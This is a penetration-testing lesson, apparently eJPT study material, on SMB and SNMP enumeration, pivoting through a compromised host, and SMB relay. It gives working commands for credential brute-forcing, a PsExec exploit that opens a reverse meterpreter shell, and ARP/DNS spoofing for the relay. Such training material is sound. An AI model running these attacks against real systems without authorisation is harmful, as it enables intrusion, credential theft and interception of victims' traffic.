# Network Attacks

This lesson covers practical network-based attack techniques — SMB/NetBIOS enumeration, SNMP enumeration, pivoting through compromised systems, and SMB relay attacks. These are core skills for the eJPT network penetration testing module.

> ⚠️ **Note**: All commands assume you are operating from a **Kali Linux** attack machine. Replace IPs and values with your actual target information.

---

## 1. SMB & NetBIOS Enumeration

### What is SMB?

**SMB (Server Message Block)** provides file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.

| SMB Version | Introduced With | Key Changes |
|-------------|----------------|-------------|
| **SMB 1.0** | Windows XP | Original version — critical security vulnerabilities (EternalBlue) |
| **SMB 2.0/2.1** | Windows Vista / Server 2008 | Improved performance and security |
| **SMB 3.0+** | Windows 8 / Server 2012 | Encryption, multi-channel support, virtualization improvements |

**Key ports**:
- **Port 445** — Direct SMB traffic (bypasses NetBIOS)
- **Port 139** — SMB over NetBIOS (required for backward compatibility)

### What is NetBIOS?

**NetBIOS (Network Basic Input/Output System)** is an API and set of network protocols for communication on local networks. It allows applications on different computers to find and interact with each other.

| Service | Port | Protocol | Purpose |
|---------|------|----------|---------|
| **Name Service (NetBIOS-NS)** | 137 | UDP/TCP | Register, unregister, and resolve names on a LAN |
| **Datagram Service (NetBIOS-DGM)** | 138 | UDP | Connectionless communication and broadcasting |
| **Session Service (NetBIOS-SSN)** | 139 | TCP | Connection-oriented, reliable data transfers |

> Modern Windows primarily uses SMB with DNS for name resolution, but NetBIOS over port 139 is still enabled for backward compatibility.

---

### SMB/NetBIOS Enumeration Workflow

#### Step 1: Initial Nmap Scan

```bash
nmap -sV -sC -p 139,445 <target_ip>
```

#### Step 2: Scan for NetBIOS Name Information

```bash
# NetBIOS scan
nbtscan <target_ip>

# Alternative — query a specific IP
nmblookup -A <target_ip>
```

#### Step 3: Enumerate SMB Protocol Version

```bash
nmap -sV -p 445 --script=smb-protocols <target_ip>
```

Output tells you which SMB versions are accepted (SMBv1, v2, v3).

#### Step 4: Check SMB Security Level

```bash
nmap -sV -p 445 --script=smb-security-mode <target_ip>
```

Look for:
- **Message signing disabled** — vulnerable to relay attacks
- **Authentication level** — guest/anonymous access enabled?

#### Step 5: Find All SMB Nmap Scripts

```bash
ls -al /usr/share/nmap/scripts/ | grep -e "smb"
```

#### Step 6: Test Anonymous Login with smbclient

```bash
# List available shares anonymously
smbclient -L //<target_ip> -N

# Connect to a specific share
smbclient //<target_ip>/<share_name> -N
```

`-N` = no password (anonymous login). If successful, you can see all share names.

#### Step 7: Enumerate SMB Users

If SMBv1 is running and anonymous access is allowed:

```bash
nmap -sV -p 445 --script=smb-enum-users <target_ip>
```

Save discovered usernames to a file:

```bash
echo "admin
bob
administrator" > users.txt
```

#### Step 8: Brute-force SMB Credentials

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>
```

Or with Metasploit:

```bash
msfconsole
msf6 > use auxiliary/scanner/smb/smb_login
msf6 > set RHOSTS <target_ip>
msf6 > set USER_FILE users.txt
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run
```

#### Step 9: Gain Shell with PsExec

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser <username>
msf6 > set SMBPass <password>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <your_ip>
msf6 > exploit
```

---

### Pivoting to a Second Target

Once you have a Meterpreter session on the first machine, you can pivot to reach internal systems not directly accessible from Kali.

#### Step 1: Discover the Second Target

```bash
meterpreter > shell
C:\> ping <target2_ip>
```

#### Step 2: Set Up the Network Route

```bash
meterpreter > run autoroute -s <subnet_of_target2>
# Example: run autoroute -s <target_network>/24
```

#### Step 3: Set Up SOCKS Proxy

```bash
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
```

#### Step 4: Scan Target 2 Through the Tunnel

```bash
# Edit /etc/proxychains.conf to include:
# socks5 127.0.0.1 1080

proxychains nmap <target2_ip> -sT -Pn -sV -p 445
```

`-sT` (TCP connect scan) is required through proxychains — SYN scans don't work through a proxy.

#### Step 5: Access Shared Resources on Target 2

```bash
# From the first meterpreter shell session
meterpreter > shell

# View available network shares
C:\> net view \\<target2_ip>

# Map a remote share to a local drive letter
C:\> net use D: \\<target2_ip>\<share_name>

# Browse the mapped drive
C:\> dir D:\
```

---

### SMB Enumeration Quick Reference

| Task | Command |
|------|---------|
| Scan SMB ports | `nmap -sV -p 139,445 <target_ip>` |
| NetBIOS scan | `nbtscan <target_ip>` |
| Enumerate SMB version | `nmap --script=smb-protocols -p 445 <target_ip>` |
| Check security mode | `nmap --script=smb-security-mode -p 445 <target_ip>` |
| Enumerate users | `nmap --script=smb-enum-users -p 445 <target_ip>` |
| List shares anonymously | `smbclient -L //<target_ip> -N` |
| Brute-force credentials | `hydra -L users.txt -P rockyou.txt smb://<target_ip>` |
| Get shell via PsExec | `exploit/windows/smb/psexec` |

---

## 2. SNMP Enumeration

### What is SNMP?

**SNMP (Simple Network Management Protocol)** is a widely used protocol for monitoring and managing networked devices — routers, switches, servers, printers. It allows administrators to query devices for status, configure settings, and receive alerts.

**Architecture**:

| Component | Role |
|-----------|------|
| **SNMP Manager** | System that queries and interacts with SNMP agents |
| **SNMP Agent** | Software on networked devices that responds to queries and sends traps |
| **MIB (Management Information Base)** | Hierarchical database defining available data — each entry has a unique **OID (Object Identifier)** |

**SNMP Versions**:

| Version | Authentication | Security |
|---------|---------------|---------|
| **v1** | Community strings (plaintext) | Weak — no encryption |
| **v2c** | Community strings (plaintext) | Improved bulk transfers, still weak |
| **v3** | User-based authentication | Encryption + message integrity — most secure |

**Key ports**:
- **Port 161 (UDP)** — SNMP queries
- **Port 162 (UDP)** — SNMP traps (notifications sent to manager)

**Default community strings** (act as passwords):
- `public` — read-only access (most common default)
- `private` — read-write access

> In penetration testing, guessing or brute-forcing community strings is often the first step — they grant access to all SNMP data on the device.

---

### SNMP Enumeration Workflow

#### Step 1: Detect SNMP with Nmap

```bash
nmap -sU -p 161 <target_ip>
```

UDP scan is required — SNMP runs on UDP 161.

#### Step 2: Brute-force Community Strings

```bash
nmap -sU -p 161 --script=snmp-brute <target_ip>
```

Or with Metasploit:

```bash
msfconsole
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 > set RHOSTS <target_ip>
msf6 > run
```

#### Step 3: Extract Information with snmpwalk

```bash
# Walk the full SNMP tree
snmpwalk -v <version> -c <community_string> <target_ip>

# Example with v1 and community string "public"
snmpwalk -v 1 -c public <target_ip>

# Example with v2c
snmpwalk -v 2c -c public <target_ip>
```

**Key OIDs for pentesting**:

| OID | Information Retrieved |
|-----|----------------------|
| `1.3.6.1.2.1.1` | System info (hostname, OS, uptime) |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.25.6.3.1.2` | Installed software |
| `1.3.6.1.2.1.6.13.1.3` | Open TCP ports |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |

#### Step 4: Run All SNMP Nmap Scripts

```bash
nmap -sU -p 161 --script snmp-* <target_ip> > snmp_info.txt
```

This dumps everything SNMP exposes — system info, users, running processes, network interfaces, installed software.

#### Step 5: Leverage SNMP Data for Further Attacks

After extracting usernames from SNMP:

```bash
# Brute-force with discovered usernames
hydra -L snmp_users.txt -P /usr/share/wordlists/rockyou.txt smb://<target_ip>

# Or use Metasploit PsExec module with found credentials
msf6 > use exploit/windows/smb/psexec
```

---

### SNMP Enumeration Quick Reference

| Task | Command |
|------|---------|
| Detect SNMP | `nmap -sU -p 161 <target_ip>` |
| Brute-force community strings | `nmap -sU -p 161 --script=snmp-brute <target_ip>` |
| Walk SNMP tree | `snmpwalk -v 1 -c public <target_ip>` |
| Run all SNMP scripts | `nmap -sU -p 161 --script snmp-* <target_ip>` |
| Extract users (Windows) | OID `1.3.6.1.4.1.77.1.2.25` via snmpwalk |

---

## 3. SMB Relay Attack

### What is an SMB Relay Attack?

An **SMB relay attack** is a Man-in-the-Middle (MitM) attack where the attacker intercepts SMB authentication traffic, captures NTLM hashes, and **relays** them to another server to gain unauthorized access — without ever needing to crack the hash.

```
Client → [sends NTLM hash to connect to server] → Attacker intercepts
Attacker → relays hash to Target Server → gains access as the client
```

**Why it works**: NTLM authentication is challenge-response based. The hash itself is sufficient to authenticate — no plaintext password needed.

**Prerequisites**:
- SMB signing **disabled** on the target (check with `smb-security-mode` script)
- Attacker can intercept traffic (ARP spoofing, DNS poisoning, or rogue server)

---

### SMB Relay Attack Workflow

#### Step 1: Set Up the SMB Relay in Metasploit

```bash
msfconsole
msf6 > use exploit/windows/smb/smb_relay
msf6 > set SRVHOST <your_ip>
msf6 > set LHOST <your_ip>
msf6 > set SMBHOST <final_target_ip>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > exploit -j
```

This sets up a rogue SMB server waiting to capture and relay NTLM hashes.

#### Step 2: Create DNS Spoofing Records

Create a file pointing the target domain to your machine:

```bash
echo "<your_ip> *.target-domain.com" > dns_records
```

#### Step 3: Enable IP Forwarding

Required so legitimate traffic still flows while you intercept:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

#### Step 4: Start DNS Spoofing

```bash
dnsspoof -i eth1 -f dns_records
```

This forges DNS replies — when the victim looks up the target domain, DNS returns your IP instead.

#### Step 5: Set Up ARP Spoofing (Two Terminals)

ARP poisoning positions you between the victim and the gateway:

```bash
# Terminal 1 — poison victim's ARP cache (tell victim: gateway is at your MAC)
arpspoof -i eth1 -t <victim_ip> <gateway_ip>

# Terminal 2 — poison gateway's ARP cache (tell gateway: victim is at your MAC)
arpspoof -i eth1 -t <gateway_ip> <victim_ip>
```

**How the full attack chain works**:
1. ARP spoofing → all victim traffic passes through your machine.
2. DNS spoofing → victim's SMB connection to the target domain is redirected to your rogue server.
3. SMB relay module → captures the NTLM hash and relays it to the real target server.
4. You get a Meterpreter session on the target server authenticated as the victim.

#### Step 6: Verify and Use the Session

```bash
msf6 > sessions -l
msf6 > sessions -i <session_id>
meterpreter > getuid
meterpreter > sysinfo
```

---

### SMB Relay Attack Summary

| Step | Tool | Purpose |
|------|------|---------|
| **Set up relay** | Metasploit `smb_relay` | Rogue SMB server to capture/relay NTLM hashes |
| **Enable IP forwarding** | `echo 1 > /proc/sys/net/ipv4/ip_forward` | Allow traffic to pass through attacker machine |
| **DNS spoofing** | `dnsspoof` | Redirect victim's domain requests to attacker |
| **ARP spoofing** | `arpspoof` | Position attacker between victim and gateway |
| **Result** | Meterpreter session | Authenticated access as the victim user |

---

## Key Takeaways

- **SMB** operates on ports **445** (direct) and **139** (over NetBIOS) — always scan both.
- **SMBv1** is dangerous — supports anonymous enumeration and is vulnerable to EternalBlue. Identify it with `smb-protocols`.
- **Anonymous SMB login** (`smbclient -L //<ip> -N`) reveals shares, and combined with `smb-enum-users`, exposes user accounts.
- Always check **SMB security mode** (`smb-security-mode`) — disabled message signing = vulnerable to relay attacks.
- **Pivoting**: use `autoroute` + `socks_proxy` + `proxychains` to reach internal targets through a compromised machine.
- When pivoting, use **`-sT` (TCP connect)** with proxychains — SYN scans don't work through SOCKS proxies.
- Use `net view` and `net use` on the compromised Windows machine to access shares on internal targets.
- **SNMP** runs on **UDP port 161** — always use `-sU` when scanning for it.
- Default SNMP community strings are `public` (read) and `private` (write) — brute-force with `snmp-brute` or `snmpwalk`.
- **`snmpwalk`** extracts system info, running processes, installed software, open ports, and user accounts.
- Run all SNMP scripts at once: `nmap -sU -p 161 --script snmp-* <ip>` — saves output for offline analysis.
- **SMB relay attacks** intercept NTLM hashes and replay them — no password cracking needed.
- SMB relay requires: SMB signing **disabled** on target + MitM position (ARP + DNS spoofing).
- The attack chain: `arpspoof` (MitM) → `dnsspoof` (redirect traffic) → `smb_relay` (capture and relay NTLM hash) → Meterpreter session.
- Always enable **IP forwarding** (`echo 1 > /proc/sys/net/ipv4/ip_forward`) before ARP spoofing to avoid cutting off the victim's traffic.
